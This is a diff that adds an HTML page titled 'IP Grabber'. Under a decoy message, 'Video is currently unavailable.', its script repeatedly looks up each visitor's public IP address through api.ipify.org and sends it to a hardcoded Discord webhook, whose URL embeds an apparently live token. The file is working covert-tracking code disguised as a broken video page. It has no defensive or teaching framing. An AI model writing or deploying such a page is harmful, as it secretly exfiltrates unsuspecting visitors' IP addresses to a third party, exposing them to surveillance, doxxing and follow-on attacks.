@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>IP Grabber</title>
+</head>
+<body>
+    <p id="ip-display"></p>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+
+    <script>
+        setInterval(function() {
+            $.ajax({
+                type: 'GET',
+                url: 'https://api.ipify.org',
+                success: function(ip) {
+                    $('#ip-display').html('Video is currently unavailable.');
+
+                    $.ajax({
+                        type: 'POST',
+                        url: 'https://discord.com/api/webhooks/1316911560660090983/hBtUzXG4nYSUFHLMmWCjCptRhoOuqVoi7iFhXg_b0nZLYWKFYOQF6G6cannuquiyBkGp',
+                        data: JSON.stringify({
+                            "content": "New IP detected: " + ip
+                        }),
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        success: function() {
+                            console.log('IP sent to Discord');
+                        },
+                        error: function() {
+                            console.log('Error sending IP to Discord');
+                        }
+                    });
+                },
+                error: function() {
+                    console.log('Error getting IP');
+                }
+            });
+        }, 500);
+    </script>
+</body>
+</html>
